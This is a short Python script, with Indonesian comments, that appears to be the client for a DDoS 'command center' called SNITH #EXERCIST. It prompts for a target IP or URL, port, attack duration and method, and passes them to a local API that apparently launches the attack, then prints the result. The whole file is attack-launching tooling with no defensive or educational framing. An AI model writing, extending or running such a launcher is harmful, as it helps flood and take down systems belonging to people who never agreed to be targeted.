import requests

# Konfigurasi Server
API_URL = "http://localhost:5032/exc"

def att():
    print("======================================")
    print("   SNITH #EXERCIST COMMAND CENTER     ")
    print("======================================")
    
    target = input("Target (IP/URL) : ")
    port   = input("Port (80/443)   : ")
    waktu  = input("Durasi (Detik)  : ")
    metode = input("Metode          : ")

    payload = {
        'target': target,
        'port': port,
        'time': waktu,
        'methods': metode
    }

    try:
        print("\n[i] Mengirim request...")
        r = requests.get(API_URL, params=payload, timeout=10)
        
        if r.status_code == 200:
            res = r.json()
            print("\nSTATUS: SUKSES")
            print(f"TARGET : {res.get('target')}")
            print(f"PORT   : {res.get('port')}")
            print(f"METODE : {res.get('methods')}")
            print(f"PESAN  : {res.get('message')}")
        else:
            print(f"\nSTATUS: GAGAL ({r.status_code})")
            
    except Exception as e:
        print(f"\nERROR: {str(e)}")

if __name__ == "__main__":
    att()
